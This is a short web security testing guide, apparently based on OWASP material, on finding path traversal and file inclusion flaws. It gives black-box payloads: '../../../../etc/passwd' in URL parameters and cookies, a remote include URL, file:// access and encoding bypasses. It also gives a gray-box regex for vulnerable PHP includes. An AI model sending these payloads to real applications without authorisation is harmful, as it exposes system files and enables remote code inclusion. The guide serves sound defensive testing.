# OVERVIEW #

$${\color{green}Summary}$$

Web applications often manage files and rely on input validation to secure them. Poor validation can let attackers access or modify files they shouldn’t be able to, or even run unauthorized code.

$${\color{green}Test \space Objectives}$$

- Find where attackers can exploit path traversal vulnerabilities.
- Assess how bypass techniques can extend path traversal.

# HOW TO TEST #

$${\color{green}Black-Box \space Testing}$$

**1.Input Vectors Enumeration:**
- Identify all user inputs, including URL parameters, form fields, file uploads, and cookies.
- Check for file-related parameters and unusual file extensions. Example checks:
  - `http://example.com/getUserProfile.jsp?item=ikki.html`
  - `http://example.com/index.php?file=content`
  - `http://example.com/main.cgi?home=index.htm`
- Examine cookies that might influence file operations:
  - `Cookie: TEMPLATE=flower`
  - `Cookie: PSTYLE=GreenDotRed`

2.Testing Techniques:
- Path Traversal: Test by manipulating paths to access restricted files:
  - `http://example.com/getUserProfile.jsp?
    item=../../../../etc/passwd`
  - `Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd`
- Remote File Inclusion: Test if the application includes files from external sources:
  - `http://example.com/index.php?
    file=http://www.owasp.org/malicioustxt`
- Local and Remote File Access: Test using file protocols and remote paths:
  - `http://example.com/index.php?file=file:///etc/passwd`
  - `http://example.com/index.php?file=http://localhost:8080`
- Encoding Techniques: Try various encodings to bypass filters:
  - URL encoding: `%2e%2e%2f` for `../`
  - Unicode encoding: `..%c0%af` for `../`
- OS-Specific Considerations:
  - Windows: Handles paths flexibly, with some special characters ignored.

$${\color{green}Gray-Box \space Testing}$$

**1.Review Source Code:**
- Search for file inclusion functions and filesystem operations.
  - For PHP: `include()`, `require()`
  - For JSP: `java.io.File()`
  - For ASP: `include file`
- Use code search tools or regex patterns to identify vulnerabilities:
  - PHP: `include|require(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)`

**2.Database and Application Logic:**
- Check if path traversal strings are inserted into the database and used in file inclusion.
- Analyze how the application sanitizes or handles invalid inputs to avoid warnings or errors.
